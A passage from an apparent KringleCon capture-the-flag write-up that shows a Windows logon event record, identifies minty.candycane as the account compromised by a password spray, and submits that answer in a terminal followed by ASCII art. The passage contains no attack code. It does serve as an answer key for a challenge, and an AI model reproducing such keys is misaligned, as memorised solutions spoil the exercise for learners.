&lt;Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID="664" ThreadID="12152"&gt;&lt;/Execution&gt;
&lt;Channel&gt;Security&lt;/Channel&gt;
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
&lt;Security UserID=""&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name="SubjectUserSid"&gt;S-1-5-18&lt;/Data&gt;
&lt;Data Name="SubjectUserName"&gt;WIN-KCON-EXCH16$&lt;/Data&gt;
&lt;Data Name="SubjectDomainName"&gt;EM.KRINGLECON&lt;/Data&gt;
&lt;Data Name="SubjectLogonId"&gt;0x00000000000003e7&lt;/Data&gt;
&lt;Data Name="TargetUserSid"&gt;S-1-5-21-25059752-1411454016-2901770228-1156&lt;/Data&gt;
&lt;Data Name="TargetUserName"&gt;<span style="color: rgb(255, 64, 64); font-weight: bold;">minty.candycane</span>&lt;/Data&gt;
&lt;Data Name="TargetDomainName"&gt;EM.KRINGLECON&lt;/Data&gt;
&lt;Data Name="TargetLogonId"&gt;0x0000000001175cd9&lt;/Data&gt;
&lt;Data Name="LogonType"&gt;8&lt;/Data&gt;
&lt;Data Name="LogonProcessName"&gt;Advapi  &lt;/Data&gt;
&lt;Data Name="AuthenticationPackageName"&gt;Negotiate&lt;/Data&gt;
&lt;Data Name="WorkstationName"&gt;WIN-KCON-EXCH16&lt;/Data&gt;
&lt;Data Name="LogonGuid"&gt;{5b50bc0d-2707-1b79-e2cb-6e5872170f2d}&lt;/Data&gt;
&lt;Data Name="TransmittedServices"&gt;-&lt;/Data&gt;
&lt;Data Name="LmPackageName"&gt;-&lt;/Data&gt;
&lt;Data Name="KeyLength"&gt;0&lt;/Data&gt;
&lt;Data Name="ProcessId"&gt;0x00000000000019f0&lt;/Data&gt;
&lt;Data Name="ProcessName"&gt;C:\Windows\System32\inetsrv\w3wp.exe&lt;/Data&gt;
&lt;Data Name="IpAddress"&gt;172.31.254.101&lt;/Data&gt;
&lt;Data Name="IpPort"&gt;40762&lt;/Data&gt;
&lt;Data Name="ImpersonationLevel"&gt;%%1833&lt;/Data&gt;
&lt;Data Name="RestrictedAdminMode"&gt;-&lt;/Data&gt;
&lt;Data Name="TargetOutboundUserName"&gt;-&lt;/Data&gt;
&lt;Data Name="TargetOutboundDomainName"&gt;-&lt;/Data&gt;
&lt;Data Name="VirtualAccount"&gt;%%1843&lt;/Data&gt;
&lt;Data Name="TargetLinkedLogonId"&gt;0x0000000000000000&lt;/Data&gt;
&lt;Data Name="ElevatedToken"&gt;%%1842&lt;/Data&gt;
&lt;/EventData&gt;
&lt;/Event&gt;</pre>
        <p>There are two results '4624' successful logins for the user <b>minty.candycane</b>. The first is during the timeframe of the password spray attack, the seccond appears to be after the attack, likely the attacker testing the credentials.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ runtoanswer
Loading, please wait......



Whose account was successfully accessed by the attacker's password spray? minty.candycane


<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMM</span>MM<span style="color: rgb(211, 215, 207);">MM</span>MM<span style="color: rgb(52, 101, 164);">kl</span><span style="color: rgb(6, 152, 154);">0</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">O0</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">OO</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">xlllooldollo0</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMMW</span><span style="color: rgb(52, 101, 164);">0O</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kollldO</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(52, 101, 164);">KO</span><span style="color: rgb(6, 152, 154);">K</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMMMM</span>MM<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">ollox0</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(211, 215, 207);">MM</span><span style="color: rgb(52, 101, 164);">xlO</span><span style="color: rgb(211, 215, 207);">MMM</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Odllld</span><span style="color: rgb(211, 215, 207);">WMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMM</span>MMMM<span style="color: rgb(211, 215, 207);">MMMMMM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Odlllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">xlk0xollox0</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MMMMMM</span>MMM<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">kk</span><span style="color: rgb(6, 152, 154);">X</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMM</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kollllllldk</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">MMMMMMMM</span>M<span style="color: rgb(6, 152, 154);">0</span><span style="color: rgb(52, 101, 164);">kO</span><span style="color: rgb(211, 215, 207);">WMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMM</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">KX</span><span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMMM</span>MM<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Oold0</span><span style="color: rgb(6, 152, 154);">N</span>MMM<span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">KK</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">MMMMM</span>
<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">M</span>MMM<span style="color: rgb(52, 101, 164);">dll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">N</span>M<span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">00</span><span style="color: rgb(211, 215, 207);">WMMMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">Ollk</span>MMM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">M</span>
M<span style="color: rgb(52, 101, 164);">kox0</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">kllx</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">xllldoldolllO</span>MM<span style="color: rgb(211, 215, 207);">MMMMMMMMMM</span><span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">MM</span><span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Odl0</span>M
MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0dllll</span><span style="color: rgb(6, 152, 154);">0</span>MM<span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(211, 215, 207);">MMMM</span>MMM<span style="color: rgb(211, 215, 207);">MMMM</span>MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0xolllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MMM</span>MMMMM<span style="color: rgb(211, 215, 207);">MM</span><span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">kllllx0</span><span style="color: rgb(6, 152, 154);">N</span>MM
M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0xolllolxOxllx</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">xdO</span>M<span style="color: rgb(211, 215, 207);">MM</span>MM<span style="color: rgb(211, 215, 207);">WMM</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">xlO</span><span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(211, 215, 207);">MWW</span>MM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">kdk</span><span style="color: rgb(211, 215, 207);">WMM</span><span style="color: rgb(52, 101, 164);">ollOOdlolllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">MM</span>
M<span style="color: rgb(52, 101, 164);">0lldk</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">klllld</span><span style="color: rgb(211, 215, 207);">NM</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">llo</span><span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">olok0</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">0xolx</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">lll</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">olllo0</span><span style="color: rgb(211, 215, 207);">N</span>M<span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(52, 101, 164);">Kkolo</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>
<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">WW</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Odlllokdldxllo</span><span style="color: rgb(211, 215, 207);">WMM</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">llllllooloollllll</span><span style="color: rgb(211, 215, 207);">WM</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">lllxolxxolllx0</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(211, 215, 207);">NW</span>M<span style="color: rgb(211, 215, 207);">M</span>
<span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0kolllx0</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0ollll0</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">llo</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0kolllok</span><span style="color: rgb(6, 152, 154);">KK</span><span style="color: rgb(52, 101, 164);">lll</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">klllld</span><span style="color: rgb(6, 152, 154);">K</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Odlllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">MM</span>
<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">OllldO</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">WM</span>MMM<span style="color: rgb(52, 101, 164);">kollox0Odldxllo</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(52, 101, 164);">xlO</span><span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">lllxoox0Oxlllo0</span><span style="color: rgb(211, 215, 207);">MM</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kolll</span><span style="color: rgb(6, 152, 154);">K</span>M<span style="color: rgb(211, 215, 207);">M</span>
<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0</span><span style="color: rgb(6, 152, 154);">KN</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MMM</span>MM<span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">W</span>MMM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0olllo0</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">xl0</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">klllld</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>MMM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kk</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">MMMMMM</span>MM<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">0</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0xollox0Odlokdlxxoox00xlllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">ollllO</span><span style="color: rgb(211, 215, 207);">W</span>MMMM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">klllloO</span><span style="color: rgb(211, 215, 207);">W</span>MMMM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">xllllx</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMM</span>MM<span style="color: rgb(211, 215, 207);">MMM</span>MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0xlllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">0xookdlxxook</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">0xollok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>MMMMM<span style="color: rgb(211, 215, 207);">MMMMMMM</span>M<span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(211, 215, 207);">MMM</span>
<span style="color: rgb(211, 215, 207);">MMW</span><span style="color: rgb(6, 152, 154);">KK</span><span style="color: rgb(211, 215, 207);">W</span>MMM<span style="color: rgb(211, 215, 207);">MMMM</span>M<span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">k0</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>MMM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0ollloO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">klllld</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>MMM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">OO</span><span style="color: rgb(6, 152, 154);">X</span>M<span style="color: rgb(211, 215, 207);">MMM</span>MMMM<span style="color: rgb(6, 152, 154);">NKK</span><span style="color: rgb(211, 215, 207);">MMM</span>
<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">kllldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">klllok00xoodllo</span>MMMM<span style="color: rgb(52, 101, 164);">xlO</span>MMM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">lllxook00xollo0</span><span style="color: rgb(211, 215, 207);">MMM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kdlll</span><span style="color: rgb(6, 152, 154);">K</span>M<span style="color: rgb(211, 215, 207);">M</span>
<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0xollox0</span><span style="color: rgb(6, 152, 154);">N</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0ollllO</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">llo</span><span style="color: rgb(6, 152, 154);">NK</span><span style="color: rgb(52, 101, 164);">kollldO</span><span style="color: rgb(6, 152, 154);">KK</span><span style="color: rgb(52, 101, 164);">lll</span><span style="color: rgb(211, 215, 207);">WM</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">klllld</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">0xlllok</span><span style="color: rgb(6, 152, 154);">0N</span>MM<span style="color: rgb(211, 215, 207);">M</span>
MM<span style="color: rgb(211, 215, 207);">WW</span>M<span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kollldkxlodllo</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">llllllooloollllll</span><span style="color: rgb(211, 215, 207);">WMM</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">lllxooxkollldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>MM<span style="color: rgb(211, 215, 207);">WM</span>M<span style="color: rgb(211, 215, 207);">M</span>
M<span style="color: rgb(6, 152, 154);">0</span><span style="color: rgb(52, 101, 164);">lldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">klllld</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">llo</span><span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">olox0</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">Oxlld</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">lll</span><span style="color: rgb(6, 152, 154);">N</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">olllo0</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kdlo</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>
M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">0xlllodldOxllx</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">xdO</span>M<span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(211, 215, 207);">MNM</span>MMM<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(52, 101, 164);">xlO</span>MM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">WNM</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(52, 101, 164);">xdx</span><span style="color: rgb(211, 215, 207);">WMM</span><span style="color: rgb(52, 101, 164);">ollkkoldlllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M
MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0xllll0</span>MM<span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(211, 215, 207);">M</span>MMMMMM<span style="color: rgb(211, 215, 207);">MMMMM</span>M<span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kolllok</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">MMMMM</span>MMMM<span style="color: rgb(211, 215, 207);">MMM</span><span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(52, 101, 164);">kllllk</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span>
M<span style="color: rgb(52, 101, 164);">kldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">kllx</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">xlllooloolll0</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span><span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">MM</span><span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kol0</span>M
M<span style="color: rgb(211, 215, 207);">WW</span>MMM<span style="color: rgb(52, 101, 164);">dll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">O0</span><span style="color: rgb(6, 152, 154);">X</span>M<span style="color: rgb(52, 101, 164);">xl0</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">OO</span><span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">MM</span><span style="color: rgb(52, 101, 164);">Ollk</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MWM</span>M
<span style="color: rgb(211, 215, 207);">MMMMM</span>M<span style="color: rgb(6, 152, 154);">NKK</span><span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(52, 101, 164);">kllx</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMM</span>MM<span style="color: rgb(6, 152, 154);">N</span><span style="color: rgb(52, 101, 164);">0old</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMMM</span>M<span style="color: rgb(52, 101, 164);">oll</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(211, 215, 207);">MMW</span><span style="color: rgb(6, 152, 154);">KK</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">MMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMM</span>MM<span style="color: rgb(211, 215, 207);">MMM</span>M<span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">kx</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">MMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(6, 152, 154);">K</span><span style="color: rgb(52, 101, 164);">kollllllldO</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(211, 215, 207);">M</span>MMMM<span style="color: rgb(211, 215, 207);">MMMMM</span>MM<span style="color: rgb(52, 101, 164);">0xk</span><span style="color: rgb(211, 215, 207);">WMM</span>MM<span style="color: rgb(211, 215, 207);">MMMMMMMM</span>
<span style="color: rgb(211, 215, 207);">MMMMMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMM</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(6, 152, 154);">X</span><span style="color: rgb(52, 101, 164);">0xlllok0xlk0xollox0</span><span style="color: rgb(6, 152, 154);">N</span>MM<span style="color: rgb(211, 215, 207);">MMMMM</span>M<span style="color: rgb(211, 215, 207);">MM</span>MM<span style="color: rgb(211, 215, 207);">MMMMMMMMMMMM</span>
